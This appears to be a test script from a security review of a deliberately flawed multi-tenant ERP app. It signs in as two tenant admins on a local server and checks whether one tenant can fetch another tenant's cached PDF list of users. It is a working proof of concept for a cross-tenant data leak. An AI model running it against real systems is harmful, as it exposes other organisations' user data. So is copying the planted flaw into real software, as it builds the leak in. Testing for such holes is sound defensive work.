// Critic p06 r9: live check of plant L12 on the planted stack (port 20652): tenant B (Al Noor) prints
// its whole users list as a PDF; tenant A (Gulf Steel) then asks for the same URL.
const BASE = process.env.OURS || 'http://localhost:20652';
async function token(email) { for (;;) { const r = await fetch(BASE + '/api/auth/sign-in', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Erp-Request': '1' }, body: JSON.stringify({ email, password: 'Demo-Pass-2026', issueToken: true }) }); if (r.status === 429) { await new Promise(s => setTimeout(s, 5000)); continue; } return (await r.json()).token; } }
const get = async (t, p) => { const r = await fetch(BASE + p, { headers: { Authorization: 'Bearer ' + t, 'X-Erp-Request': '1' } }); return { status: r.status, buf: Buffer.from(await r.arrayBuffer()) }; };
const victim = await token('admin@alnoor.example'), attacker = await token('admin@gulfsteel.example');
const url = '/api/reports/lists/identity.users?format=pdf&language=en';
const before = await get(attacker, url);
console.log('attacker first (nothing spooled):', before.status, before.buf.length, 'bytes');
const v = await get(victim, url);
console.log('victim prints its whole list:', v.status, v.buf.length, 'bytes');
const a = await get(attacker, url);
console.log('attacker same URL after the victim:', a.status, a.buf.length, 'bytes; identical to the victim\'s PDF:', a.buf.equals(v.buf));
